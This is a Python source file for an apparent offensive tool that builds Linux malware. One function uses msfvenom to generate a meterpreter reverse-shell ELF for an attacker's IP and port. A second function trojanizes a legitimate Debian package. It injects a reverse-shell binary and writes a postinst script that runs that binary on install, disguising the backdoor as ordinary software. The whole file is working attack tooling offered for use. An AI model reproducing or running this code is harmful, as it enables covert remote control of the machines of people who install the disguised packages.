import os
from assets import *

def lin_vir():
    print('''
    {\  ***  /}
    {{\  _  /}} Lets Play
    {{{\(_)/}}} With RedBull
    {{{(_j_)}}} 
     {{{/ \}}}  
      {/   \}   
      /     '
     (_______)    
    
    ''')
    load()
    type_buat()
    set_ip = input("your ip local : ")
    set_port = input("your port : ")
    filennya = input("file name (.elf): ")
    folder = input("save to folder : ")
    
    if not os.path.exists(folder):
        os.system("mkdir {}".format(folder))
    else:
        load()
    
    h_lin = folder+'/'+filennya
    os.system("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={} LPORT={} > {} >/dev/null 2>&1".format(set_ip, set_port, h_lin))
    if not os.path.exists(h_lin):
        print("fail to create virus, check your config")
    else:
        type_sukses()
        print("Your location file : {}".format(os.getcwd()+"/"+h_lin))

def bind_lin():
    print(werno.biru+'''
          __/)     (\__
      ,-'~~(   _   )~~`-.
     /      \/'_`\/      '
    |       /_(_)_\       | Keep Clown dan Carry On
    |     _(/(\_/)\)_     | Enjoy with RedBull :)
    |    / // \ / '' \    |
     \  | ``  / \ ''  |  /
      \  )   /   \   (  /
       )/   /     \   \(
       '    `-`-'-'    `    
    '''+werno.normal)
    load()
    print("Download first package deb")
    pck_deb = input("enter pakcage you want download ex(gparted): ")
    os.system("apt-get --download-only install {} >/dev/null 2>&1".format(pck_deb))
    print("wait, we will search your package")
    os.system("ls /var/cache/apt/archives | grep {}".format(pck_deb))
    load()
    pck_dname = input("enter your file package : ")
    pck_ver = input("package version : ")
    pck_sec = input("package section : ")
    pck_prio = input("package priority : ")
    pck_arch = input("package architecture : ")
    pck_main = input("package maintainer : ")
    pck_desc = input("package description (use | to new line): ")

    new_pck = input("Enter new package name : ")
    print('''
    + if your package is for game enter path games
    + if your package is for utility enter path sbin
    ''')
    path_pck = input("package daemon path : ")
    
    con = {
        "Package" : "{}".format(pck_deb),
        "Version" : "{}".format(pck_ver),
        "Section" : "{}".format(pck_sec),
        "Priority" : "{}".format(pck_prio),
        "Architecture" : "{}".format(pck_arch),
        "Maintainer" : "{}".format(pck_main),
        "Description" : "{}".format(pck_desc)
    }
    arch_file = input("architecture file ex(x86, x64): ")
    ip_l = input("your ip local : ")
    ip_p = input("your port : ")
    out_file = input("filename output (.deb) : ")
    sv_fldr = input("save to folder : ")

    if not os.path.exists(sv_fldr):
        os.system("mkdir {}".format(sv_fldr))
    else:
        load()
    lin_hasil = sv_fldr+'/'+out_file
    bind_load()
    temp_fldr = "/tmp/Redbull"
    if not os.path.exists(temp_fldr):
        os.system("mkdir {}".format(temp_fldr))
    else:
        print("Already created temp directory")
    
    os.system("mv /var/cache/apt/archives/{} {}".format(pck_dname, temp_fldr))
    os.system("dpkg -x {}/{} {}/sample".format(temp_fldr,pck_dname,temp_fldr))
    os.system("mkdir {}/sample/DEBIAN".format(temp_fldr))

    with open("{}/sample/DEBIAN/control".format(temp_fldr), "w") as prox:
        for key, value, in con.items():
            prox.write("%s: %s\n" % (key, value))

    with open("{}/sample/DEBIAN/control".format(temp_fldr), "r+") as baca:
        iqro = baca.read()
        if "|" in iqro:
            baca.seek(0)
            ganti = iqro.replace("|", "\n ")
        baca.write(ganti)
    
    with open("{}/sample/DEBIAN/postinst".format(temp_fldr), "w") as pos:
        pos.write("#!/bin/sh\n\nchmod 2755 /usr/{}/{}\nchmod 2755 /usr/{}/{}\n/usr/{}/./{}".format(path_pck, new_pck, path_pck, pck_deb, path_pck, new_pck))
    
    os.system("msfvenom -a {} --platform linux -p linux/x86/shell/reverse_tcp LHOST={} LPORT={} -f elf -o {}/sample/usr/{}/{} >/dev/null 2>&1".format(arch_file, ip_l, ip_p, temp_fldr, path_pck, new_pck))
    os.system("chmod 755 {}/sample/DEBIAN/postinst".format(temp_fldr))
    os.system("dpkg-deb --build {}/sample >/dev/null 2>&1".format(temp_fldr))
    os.system("mv {}/sample.deb {}/{}".format(temp_fldr, temp_fldr, out_file))
    os.system("cp {}/{} {}/{}".format(temp_fldr, out_file, os.getcwd(), sv_fldr))
    os.system("mkdir config/{} && cp -R {}/sample config/{}".format(pck_deb, temp_fldr, pck_deb))
    if not os.path.exists(lin_hasil):
        print("Sorry your exe target not support with payload byte encoder")
        print("fail to bind server, check your config")
        return bind_lin()
    else:
        print("Your output: {}".format(lin_hasil))
        print("Your config file : config/{}".format(pck_deb))
    os.system("rm -R {}/*".format(temp_fldr))
    load()